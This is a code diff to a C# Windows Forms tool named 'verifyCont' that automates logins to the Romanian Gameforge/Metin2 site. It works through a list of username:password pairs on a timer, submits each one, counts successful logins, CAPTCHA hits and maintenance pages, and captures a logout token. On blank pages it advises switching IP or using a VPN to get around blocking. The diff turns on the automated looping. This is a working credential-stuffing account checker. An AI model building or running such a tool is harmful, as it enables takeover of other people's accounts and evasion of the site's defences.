@@ -23,39 +23,50 @@ namespace verifyCont
 
             HtmlDocument doc1 = webBrowser1.Document;
             
+                try
+                {
+                    string[] part = listBox1.SelectedItem.ToString().Split(':');
 
-            try
-            {
-                string[] part = listBox1.SelectedItem.ToString().Split(':');
-                textBox1.Text = webBrowser1.DocumentText;
+                    if (textBox1.Text.Contains("trenner"))
+                    {
+                        HtmlElement user = doc1.GetElementById("username");
+                        HtmlElement pass = doc1.GetElementById("password");
+                        HtmlElement send = doc1.GetElementById("submitBtn");
 
-                //HtmlElement user = doc1.GetElementById("tnte9e60812-f3ce-4fa8-ae94-198bcf80bee2");
-                //HtmlElement pass = doc1.GetElementById("password");
-                //HtmlElement send = doc1.GetElementById("button tnta3ae34d4-6a49-4e4e-853a-ddb1e8d97787 tnt04104f69-a4e9-41cf-be63-be1905dacd68 tnt91044618-d4da-4b07-b30c-cceacb6c1581 tnte65b905d-0785-4843-8449-790a3cfb31fa tnte71d4971-a2e1-42ff-87f1-6a04526ac090");
+                        user.SetAttribute("value", part[0].ToString());
+                        pass.SetAttribute("value", part[1].ToString());
+                        send.InvokeMember("Click");
+                    }
+                    else
+                    {
+                        HtmlElement user = doc1.GetElementById("name");
+                        HtmlElement pass = doc1.GetElementById("password");
+                        HtmlElement send = doc1.GetElementById("submitBtnRight");
 
-                //user.SetAttribute("value", part[0].ToString());
-                //pass.SetAttribute("value", part[1].ToString());
-                //send.InvokeMember("Click");
-            }
-            catch (Exception)
-            {
-                //timer1.Stop();
-                MessageBox.Show("Pagină albă. Schimbă IP-ul - foloseşte VPN.");
-            }
+                        user.SetAttribute("value", part[0].ToString());
+                        pass.SetAttribute("value", part[1].ToString());
+                        send.InvokeMember("Click");
+                    }
+                }
+                catch (Exception)
+                {
+                    timer1.Stop();
+                    MessageBox.Show("Pagină albă! Schimbă IP-ul sau foloseşte VPN.");
+                }
                 try
                 {
                     listBox1.SelectedIndex += 1;
                 }
                 catch (Exception)
                 {
-                    //timer1.Stop();
+                    timer1.Stop();
                     MessageBox.Show("Toate conturile au fost verificate.");
                 }
             }
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            webBrowser1.Navigate("https://gameforge.com/ro-RO/sign-in");
+            webBrowser1.Navigate("https://ro.metin2.gameforge.com/");
         }
 
         private void button2_Click(object sender, EventArgs e)
@@ -82,6 +93,11 @@ namespace verifyCont
             if (webBrowser1.ReadyState != WebBrowserReadyState.Complete)
                 return;
             textBox1.Text = webBrowser1.DocumentText;
+            
+            string start = "logout?__token=";
+            int startindex = textBox1.Text.IndexOf(start);
+            string token = textBox1.Text.Substring(startindex + 15, 32);
+            textBox3.Text = "https://ro.metin2.gameforge.com:443/user/logout?__token=" + token;
 
             try
             {
@@ -96,12 +112,12 @@ namespace verifyCont
                     textBox2.Text += listBox1.Items[listBox1.SelectedIndex - 1] + "\r".ToString();
                     label2.Text = "CAPTCHA: " + captcha.ToString();
                 }
-                if (textBox1.Text.Contains("Parolă"))
+                if (textBox1.Text.Contains("Obține MD"))
                 {
                     good +=1;
                     textBox2.Text += listBox1.Items[listBox1.SelectedIndex - 1] + "\r".ToString();
                     label4.Text = "DIRECTE: " + good.ToString();
-                    //webBrowser1.Navigate(textBox3.Text);
+                    webBrowser1.Navigate(textBox3.Text);
                 }
                 if (textBox1.Text.Contains("întreţinere"))
                 {
@@ -116,12 +132,12 @@ namespace verifyCont
 
         private void button3_Click(object sender, EventArgs e)
         {
-            //webBrowser1.Navigate(textBox3.Text);
+            webBrowser1.Navigate(textBox3.Text);
         }
 
         private void button4_Click(object sender, EventArgs e)
         {
-            //timer1.Start();
+            timer1.Start();
         }
 
         private void textBox2_TextChanged(object sender, EventArgs e)
@@ -136,7 +152,7 @@ namespace verifyCont
 
         private void button5_Click(object sender, EventArgs e)
         {
-            //timer1.Stop();
+            timer1.Stop();
         }
     }
 }
